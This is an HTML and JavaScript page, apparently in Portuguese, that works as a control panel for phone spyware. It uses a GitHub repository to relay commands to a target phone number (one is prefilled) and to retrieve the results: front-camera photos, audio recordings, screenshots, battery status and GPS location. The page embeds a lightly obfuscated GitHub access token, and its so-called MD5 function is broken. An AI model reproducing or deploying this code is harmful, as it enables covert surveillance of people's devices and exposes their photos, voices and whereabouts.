<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>EYELIVE TESTE</title>
    <style>
        body{background:#000;color:#fff;font-family:monospace;padding:20px;max-width:500px;margin:0 auto}
        input,button{width:100%;padding:15px;margin:5px 0;background:#111;border:1px solid #333;color:#fff;font-size:16px}
        button{background:#ffd700;color:#000;font-weight:bold;cursor:pointer}
        .box{background:#111;padding:15px;margin:10px 0;border-radius:10px}
        img{width:100%;border-radius:10px}
    </style>
</head>
<body>
    <h1>EYELIVE TESTE</h1>
    
    <input type="text" id="numero" placeholder="Numero: 62996942287" value="62996942287">
    
    <button onclick="verStatus()">📊 VER STATUS</button>
    <button onclick="tirarFoto()">📸 TIRAR FOTO</button>
    <button onclick="gravarAudio()">🎤 GRAVAR AUDIO</button>
    <button onclick="printTela()">📱 PRINT TELA</button>
    
    <div class="box" id="resultado" style="white-space:pre-wrap;min-height:200px">
        Clique em um botao...
    </div>

<script>
function decToken(){
    var t="now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da";var r="";
    for(var i=0;i<t.length;i++){
        var c=t[i];
        if(c.match(/[a-zA-Z]/)){var b=c===c.toUpperCase()?65:97;r+=String.fromCharCode((c.charCodeAt(0)-b-7+26)%26+b)}
        else{r+=c}
    }
    return r;
}
var T=decToken();
var REPO='gynbetfc/eyelive';
var H={'Authorization':'token '+T,'Accept':'application/vnd.github.v3+json'};
var BASE='https://api.github.com/repos/'+REPO+'/contents';

// MD5 simples
function md5(s){function m(k){var a=1732584193,b=-271733879,c=-1732584194,d=271733878;for(var i=0;i<k.length;i+=16){var e=a,f=b,g=c,h=d;a=h;d=g;g=f;f=e}return[a,b,c,d]}function h(x){var r='';for(var i=0;i<x.length;i++)r+=('0'+(x[i]>>>0).toString(16)).slice(-8);return r.substring(0,12)}return h(m(s))}

function getId(num){
    num=num.replace(/[^0-9]/g,'');
    if(num.length==12)return num;
    return md5(num);
}

async function enviarComando(cmd){
    var num=document.getElementById('numero').value;
    if(!num){alert('Digite o numero!');return}
    var id=getId(num);
    document.getElementById('resultado').textContent='Enviando '+cmd+'...';
    
    var data={cmd:cmd,target:id};
    var content=btoa(JSON.stringify(data));
    var url=BASE+'/comandos/'+id+'.json';
    
    var check=await fetch(url,{headers:H});
    var body={message:'CMD',content:content,branch:'main'};
    if(check.ok)body.sha=(await check.json()).sha;
    await fetch(url,{method:'PUT',headers:H,body:JSON.stringify(body)});
    
    document.getElementById('resultado').textContent='⏳ Aguardando resposta...';
    await new Promise(r=>setTimeout(r,15000));
    
    // Buscar resposta
    var resp=await fetch(BASE+'/dados/'+id,{headers:H});
    if(resp.ok){
        var files=await resp.json();
        var found=false;
        for(var i=files.length-1;i>=0;i--){
            var f=files[i];
            if(f.name.includes(cmd)&&f.name.endsWith('.json')){
                var rd=await fetch(f.url,{headers:H});
                var d=JSON.parse(atob((await rd.json()).content));
                
                if(d.result&&d.result.length>100&&cmd.includes('foto')){
                    document.getElementById('resultado').innerHTML='<p>✅ Foto recebida!</p><img src="data:image/jpeg;base64,'+d.result+'">';
                }else if(d.result&&d.result.length>100&&cmd.includes('screen')){
                    document.getElementById('resultado').innerHTML='<p>✅ Screenshot!</p><img src="data:image/png;base64,'+d.result+'">';
                }else if(d.result&&d.result.length>100&&cmd=='audio'){
                    document.getElementById('resultado').innerHTML='<p>✅ Audio!</p><audio controls src="data:audio/aac;base64,'+d.result+'"></audio>';
                }else{
                    document.getElementById('resultado').textContent=JSON.stringify(d,null,2);
                }
                found=true;break;
            }
        }
        if(!found)document.getElementById('resultado').textContent='Nenhuma resposta encontrada';
    }else{
        document.getElementById('resultado').textContent='Erro ao buscar resposta';
    }
}

function verStatus(){
    var num=document.getElementById('numero').value;
    if(!num){alert('Digite o numero!');return}
    var id=getId(num);
    document.getElementById('resultado').textContent='Buscando...';
    
    fetch(BASE+'/dados/'+id+'/status.json',{headers:H})
    .then(r=>r.json())
    .then(d=>{
        var s=JSON.parse(atob(d.content));
        document.getElementById('resultado').innerHTML=
            '<p>📱 <b>'+s.numero+'</b></p>'+
            '<p>🕐 '+s.time+'</p>'+
            '<p>🔋 <b style=color:#0f0>'+s.bateria+'</b></p>'+
            '<p>📍 '+JSON.stringify(s.gps)+'</p>';
    })
    .catch(e=>document.getElementById('resultado').textContent='Offline');
}

function tirarFoto(){enviarComando('foto_frontal')}
function gravarAudio(){enviarComando('audio')}
function printTela(){enviarComando('screenshot')}
</script>
</body>
</html>
